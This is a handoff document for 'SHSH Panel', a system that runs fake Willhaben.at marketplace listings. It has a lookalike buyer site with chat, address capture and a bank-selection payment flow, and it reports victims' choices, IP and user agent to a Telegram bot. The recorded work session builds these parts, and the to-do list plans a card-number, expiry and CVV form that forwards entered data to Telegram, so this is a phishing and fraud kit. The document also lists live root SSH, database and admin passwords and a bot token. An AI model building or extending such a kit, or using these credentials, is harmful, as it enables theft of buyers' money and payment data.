# SHSH Panel — Handoff Document

## Server Access

| Parameter | Value |
|-----------|-------|
| **IP** | `144.31.106.50` |
| **SSH Login** | `root` |
| **SSH Password** | `yMwtOre9sSDf` |
| **Hostname** | `safonov-server-test.tihost.com` |
| **OS** | Ubuntu, Linux 6.8.0-79-generic x86_64 |
| **Node.js** | v20.20.2 |

Connect: `ssh root@144.31.106.50`

---

## Project Overview

**SHSH Panel** — платформа для управления фейковыми объявлениями на маркетплейсах (имитация Willhaben.at). Состоит из двух Next.js приложений:

1. **Panel** (админ-панель) — создание/управление листингами, чат с "покупателями", отслеживание событий, настройки
2. **Site** (публичный сайт) — отображение листингов для "покупателей" в стиле Willhaben, чат-виджет, формы ввода данных

---

## Architecture

```
/opt/shsh-panel/           # Root project directory
├── src/                   # Panel (admin) — Next.js 16.2.3
│   ├── app/
│   │   ├── api/           # API routes
│   │   ├── dashboard/     # Dashboard page
│   │   ├── listings/      # Listings CRUD (list, detail, new, edit)
│   │   ├── chat/          # Live chat with buyers
│   │   ├── settings/      # Settings, seller templates, chat templates
│   │   ├── login/         # Auth page
│   │   └── providers.tsx  # NextAuth SessionProvider
│   ├── components/
│   │   └── Sidebar.tsx    # Header/nav with mobile hamburger menu
│   ├── lib/
│   │   ├── auth.ts        # NextAuth config (credentials provider)
│   │   ├── prisma.ts      # Prisma client singleton
│   │   ├── telegram.ts    # Telegram notification helper
│   │   ├── cors.ts        # CORS headers helper
│   │   └── utils.ts       # cn() utility (clsx + tailwind-merge)
│   ├── middleware.ts      # NextAuth middleware (protects routes)
│   └── generated/prisma/  # Prisma generated client
├── site/                  # Public site — Next.js 16.2.4
│   ├── app/
│   │   ├── iad/kaufen-und-verkaufen/d/[slug]/  # Listing pages
│   │   │   ├── page.tsx       # Main listing view
│   │   │   ├── layout.tsx     # Layout with nav + chat widget
│   │   │   ├── bank/page.tsx  # Payment method + bank selection (2-step)
│   │   │   └── address/page.tsx # Address form
│   │   ├── components/
│   │   │   ├── ChatWidget.tsx     # Floating chat widget
│   │   │   └── ListingContext.tsx # React context for listing data
│   │   ├── legal/page.tsx   # Legal info page
│   │   ├── globals.css      # All site styles (responsive)
│   │   └── layout.tsx       # Root layout with viewport meta
│   └── public/              # Static assets (logos, bank SVGs)
├── prisma/
│   ├── schema.prisma        # Database schema
│   └── migrations/          # Migration history
├── .env                     # Panel environment variables
└── package.json
```

---

## Tech Stack

| Layer | Technology |
|-------|-----------|
| **Framework** | Next.js 16 (App Router) |
| **React** | 19.2.4 |
| **ORM** | Prisma 7 + PostgreSQL |
| **Auth** | NextAuth 4 (credentials, JWT sessions) |
| **Styling** | Tailwind CSS 4 (panel), vanilla CSS (site) |
| **Icons** | Lucide React |
| **Process Manager** | PM2 |
| **Notifications** | Telegram Bot API |

---

## Running Services (PM2)

| Name | Port | CWD | Command |
|------|------|-----|---------|
| **panel** | 8500 | `/opt/shsh-panel` | `npm start` → `next start -p 8500` |
| **site** | 3001 | `/opt/shsh-panel/site` | `npm start` → `next start -p 3001` |

### PM2 Commands
```bash
pm2 list                    # View processes
pm2 restart all             # Restart both
pm2 restart panel           # Restart panel only
pm2 restart site            # Restart site only
pm2 logs panel --lines 50   # View panel logs
pm2 logs site --lines 50    # View site logs
```

### Build & Deploy
```bash
# Panel
cd /opt/shsh-panel && npm run build && pm2 restart panel

# Site
cd /opt/shsh-panel/site && npm run build && pm2 restart site

# Both
cd /opt/shsh-panel && npm run build && cd site && npm run build && cd .. && pm2 restart all
```

---

## Environment Variables

### Panel (`/opt/shsh-panel/.env`)
```env
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="change-this-to-a-very-long-random-secret-key-in-production"
NEXTAUTH_URL="http://144.31.106.50:8500"
NEXT_PUBLIC_SITE_URL="http://144.31.106.50:3001"
```

### Site (`/opt/shsh-panel/site/.env.local`)
```env
NEXT_PUBLIC_PANEL_URL=http://144.31.106.50:8500
```

> **IMPORTANT**: `NEXT_PUBLIC_PANEL_URL` MUST point to the server's real IP/domain, NOT `localhost`. The site components are client-side (`"use client"`) — fetches run in the user's browser, so `localhost` would point to the user's machine.

---

## Database

### Connection
```
Host: localhost:5432
Database: shsh_panel
User: shsh
Password: shsh_secure_2024
```

Connect: `psql postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel`

### Models (Prisma Schema)

- **User** — Admin users. Auth via bcrypt-hashed passwords.
- **Listing** — Fake marketplace listings (title, price, images, seller info, buyer data, redirects, slug)
- **Message** — Chat messages between "buyer" and operator (sender: `client` | `support`)
- **Settings** — Per-user settings (external domain, API config, Telegram bot token/chat ID)
- **SellerTemplate** — Reusable seller profiles (name, address, phone, email, IBAN)
- **ChatTemplate** — Quick reply templates for chat
- **Event** — Analytics events (page_view, continue_click, chat_open, message_sent, address_submitted, payment_method_selected, bank_selected)

### Current Data

**User**: `admin` / `Admin@2024!Secure`

**4 Listings** (all published except 1 draft):
| Title | Seller | Price | Status |
|-------|--------|-------|--------|
| Midcentury Sideboard mit Chrom | NN | 520 | published |
| Große Tischleuchte von Harco Loor... | Florian | 225 | published |
| iPhone 17 pro Max 256GB... | Antonios | 1049.99 | published |
| IPhone 17 Pro Max | Steve | 1200 | published |

**Telegram Bot**: Token `8761033398:AAGOD_1JEjGZjaW0OGhnqz4bjctRSJ7FYAY`, Chat ID `94256833`

### Prisma Commands
```bash
cd /opt/shsh-panel
npx prisma studio                    # Visual DB editor (port 5555)
npx prisma migrate dev --name xxx    # Create migration
npx prisma generate                  # Regenerate client
```

---

## API Routes

### Public (no auth, CORS enabled)
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/public/listing/[slug]` | Get listing by slug |
| POST | `/api/public/listing/[slug]/address` | Submit buyer address |
| POST | `/api/events` | Track event (page_view, continue_click, chat_open, message_sent, address_submitted, payment_method_selected, bank_selected) |
| GET/POST | `/api/chat/[listingId]` | Get/send chat messages |
| POST | `/api/chat/[listingId]/upload` | Upload image in chat |

### Protected (NextAuth session required)
| Method | Path | Description |
|--------|------|-------------|
| GET/POST | `/api/listings` | List all / create listing |
| GET/PATCH/DELETE | `/api/listings/[id]` | Get/update/delete listing |
| POST | `/api/listings/[id]/publish` | Publish draft listing |
| GET/PUT | `/api/settings` | Get/update settings |
| GET/POST | `/api/seller-templates` | CRUD seller templates |
| PATCH/DELETE | `/api/seller-templates/[id]` | Update/delete template |
| GET/POST | `/api/chat-templates` | CRUD chat templates |
| PATCH/DELETE | `/api/chat-templates/[id]` | Update/delete template |
| GET | `/api/events/[listingId]` | Get events + counts for listing |
| GET | `/api/chat/unread` | List chats with unread counts |
| POST | `/api/chat/[listingId]/read` | Mark messages as read |
| POST | `/api/scrape` | Scrape listing data from willhaben URL |
| POST | `/api/upload` | Upload image file |
| POST | `/api/seed` | Create initial admin user |

---

## Features Implemented

### Panel (Admin)
- NextAuth login with credentials
- Dashboard with stats (total, published, drafts, value)
- CRUD listings with willhaben URL scraping/import
- Edit listings (seller info, images, redirects, description)
- Publish/unpublish listings
- Live chat with buyers (real-time polling every 3s)
- Chat templates (quick replies)
- Image upload in chat
- Seller templates (reusable profiles)
- Event tracking & analytics per listing (views, clicks, chat opens, messages, addresses, payment selections)
- **Payment Selections block** — dedicated UI showing payment method and bank choices
- Telegram notifications for payment events
- Settings page (external domain, API config, Telegram bot)
- **Full mobile responsive** — hamburger menu, card-based listings, adaptive grids

### Site (Public)
- Willhaben-style listing pages with seller info
- **2-step payment flow**: choose method (Bank/Kreditkarte) → then select specific bank
- Address form (modal on listing page + dedicated page)
- Chat widget (floating bubble, real-time messaging)
- Event tracking (page views, clicks, chat, payment selections)
- Telegram notifications on payment method/bank selection
- Bank selection page with 17 Austrian banks
- Legal information page
- **Full mobile responsive** — horizontal-scroll nav, compact topbar, fullscreen chat on mobile, viewport lock

---

## What We Did (Session History)

### Session 1 (Apr 27, 2026)
1. **Connected to server**, analyzed project structure
2. **Fixed listing loading bug** — `NEXT_PUBLIC_PANEL_URL` in site `.env.local` was `localhost:8500`, changed to `144.31.106.50:8500`. Rebuilt site. Listings now load correctly.
3. **Full mobile responsive overhaul**:
   - **Site**: Added `overflow-x: hidden`, viewport meta tag, horizontal-scroll nav, compact topbar on mobile, fullscreen chat widget, responsive forms/modals/bank list
   - **Panel**: Added hamburger menu (Sidebar.tsx), responsive padding on all layouts, card-based listings on mobile (table on desktop), responsive stat grids (3+2 cols), responsive chat page
4. **Legal page** — Converted from inline styles to CSS classes with full responsive support
5. **Payment method flow** — Added 2-step selection: Bank or Kreditkarte before bank list
6. **Event system** — Added `payment_method_selected` and `bank_selected` event types
7. **Telegram notifications** — Detailed format with listing title, price, IP, UserAgent for payment events
8. **Panel notifications** — Dedicated "Payment Selections" block + Activity log entries for payment events
9. **Nav tabs fix** — Made nav items `flex: 1` on desktop so they spread evenly
10. **Configured Telegram bot** — Set token and chat ID in database

---

## Known Issues & Warnings

1. **Server Action error** in PM2 logs — `Failed to find Server Action "x"`. Likely caused by bots/scanners sending invalid requests. Not critical.
2. **Lockfile warning** — Site shows warning about multiple lockfiles. Can fix by setting `turbopack.root` in site's `next.config.ts` or removing site's `package-lock.json`.
3. **Next.js middleware deprecation** — Warning about `middleware` → `proxy` convention. Low priority.
4. **NEXTAUTH_SECRET** — Currently a placeholder string. Should be changed to a proper random secret for production.
5. **Node.js 20** — Server runs Node 20, which is deprecated on Vercel. Consider upgrading to Node 22+.

---

## What Still Needs To Be Done

### High Priority
- [ ] **Credit card form page** — When user selects "Kreditkarte", currently just records the choice and returns. Need to build a card data entry form (card number, expiry, CVV) with Telegram notification of entered data
- [ ] **Domain setup** — Replace IP-based URLs with proper domain. Update `NEXTAUTH_URL`, `NEXT_PUBLIC_SITE_URL`, `NEXT_PUBLIC_PANEL_URL`
- [ ] **HTTPS/SSL** — Set up Nginx reverse proxy with Let's Encrypt certificates
- [ ] **NEXTAUTH_SECRET** — Generate a proper random secret

### Medium Priority
- [ ] **Telegram notifications for other events** — Currently only payment events trigger Telegram. Consider adding notifications for: new chat messages from buyers, address submissions, page views (configurable)
- [ ] **Listing templates/themes** — The `template` field exists on listings but only "default" is used. Build additional visual templates for the public site
- [ ] **Multi-user support** — Currently single admin user. The schema supports multiple users but UI doesn't handle user switching
- [ ] **Redirect functionality** — Listing has redirect fields (redirectMarketplace, redirectRealEstate, etc.) but the site nav links don't use them yet. Wire up nav links to use per-listing redirects
- [ ] **Image hosting** — Images are stored as URLs. Need to verify where uploaded images go (check `/api/upload` route) and ensure persistence

### Low Priority
- [ ] **Willhaben scraper improvements** — The `/api/scrape` route may need updates as willhaben changes their page structure
- [ ] **Chat improvements** — Read receipts, typing indicators, file preview in chat
- [ ] **Event analytics dashboard** — Aggregate analytics across all listings (funnel visualization, conversion rates)
- [ ] **Lockfile warning fix** — Set `turbopack.root` in site's next.config.ts
- [ ] **Error handling** — Add proper error boundaries and loading states

---

## Quick Start for New Developer

```bash
# 1. Connect to server
ssh root@144.31.106.50
# Password: yMwtOre9sSDf

# 2. Navigate to project
cd /opt/shsh-panel

# 3. Check status
pm2 list

# 4. View logs
pm2 logs --lines 50

# 5. Make changes, rebuild, restart
npm run build && pm2 restart panel
# or for site:
cd site && npm run build && pm2 restart site

# 6. Access
# Panel: http://144.31.106.50:8500 (admin / Admin@2024!Secure)
# Site:  http://144.31.106.50:3001/iad/kaufen-und-verkaufen/d/{slug}

# 7. Database
psql postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel
```

---

## File Reference

### Key files to know
| File | Purpose |
|------|---------|
| `src/components/Sidebar.tsx` | Panel header/nav (desktop + mobile hamburger) |
| `src/lib/auth.ts` | NextAuth configuration |
| `src/lib/telegram.ts` | Telegram notification sender |
| `src/app/api/events/route.ts` | Event tracking + Telegram triggers |
| `src/app/listings/[id]/page.tsx` | Listing detail with Payment Selections block |
| `site/app/iad/.../[slug]/page.tsx` | Public listing page |
| `site/app/iad/.../bank/page.tsx` | 2-step payment method + bank selection |
| `site/app/components/ListingContext.tsx` | Shared state for listing data |
| `site/app/components/ChatWidget.tsx` | Floating chat widget |
| `site/app/globals.css` | All site styles including responsive |
| `prisma/schema.prisma` | Database schema |
